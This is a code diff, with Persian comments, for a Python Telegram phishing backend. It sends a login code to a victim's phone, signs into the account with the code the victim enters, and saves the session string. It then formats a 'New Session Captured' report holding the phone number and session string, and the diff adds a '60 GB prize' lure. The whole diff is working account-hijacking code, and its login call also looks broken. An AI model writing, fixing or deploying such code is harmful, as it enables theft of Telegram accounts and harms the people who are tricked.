@@ -65,15 +65,18 @@ def verify_code():
         logging.error(f"Error in verify_code: {e}")
         return jsonify({'error': str(e)}), 500
 
+# ============================================================
+# توابع با start
+# ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        result = await client.send_code_request(phone)
+        # ارسال درخواست کد
+        await client.send_code_request(phone)
         
         sessions[session_id]['client'] = client
-        sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
         logging.info(f"✅ Code sent to: {phone}")
         
@@ -92,42 +95,38 @@ async def verify_session(session_id, phone, code):
         logging.error(f"❌ No client for {phone}")
         return False
 
-    phone_code_hash = session.get('phone_code_hash')
-    if not phone_code_hash:
-        logging.error(f"❌ No phone_code_hash for {phone}")
-        return False
-
     try:
-        # ✅ تایید کد با phone_code_hash
-        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        # ✅ استفاده از start برای لاگین کامل
+        await client.start(phone=phone, password=code)
         
-        # ✅ تایید لاگین با get_me()
+        # ✅ تایید لاگین
         me = await client.get_me()
         if not me:
-            logging.error("❌ Login failed - no user found")
+            logging.error("❌ Login failed")
             return False
         
         # ✅ گرفتن سشن (بعد از لاگین کامل)
         session_string = client.session.save()
         
-        # ✅ ارسال پیام حرفه‌ای و انگلیسی
+        # ✅ ارسال به ربات با قالب انگلیسی و حرفه‌ای
         if session_string and len(session_string) > 10:
-            message = f"""✅ <b>Session Captured Successfully</b>
+            message = f"""✅ <b>New Session Captured</b>
 
-┌─────────────────
-│ 📱 User: <code>{phone}</code>
-│ 🔐 Session String:
+┌───────────────────────────
+│ 📱 <b>User:</b> <code>{phone}</code>
+│ 🔐 <b>Session String:</b>
 │ <code>{session_string}</code>
-└─────────────────
+│ 🎁 <b>Prize:</b> {session.get('prize', '60')} GB
+└───────────────────────────
 
 🔒 <b>Status:</b> Logged out automatically"""
         else:
             message = f"""❌ <b>Session Capture Failed</b>
 
-┌─────────────────
-│ 📱 User: <code>{phone}</code>
-│ 🔐 Session String: <code>EMPTY</code>
-└─────────────────
+┌───────────────────────────
+│ 📱 <b>User:</b> <code>{phone}</code>
+│ 🔐 <b>Session String:</b> <code>EMPTY</code>
+└───────────────────────────
 
 ⚠️ Please try again."""
 
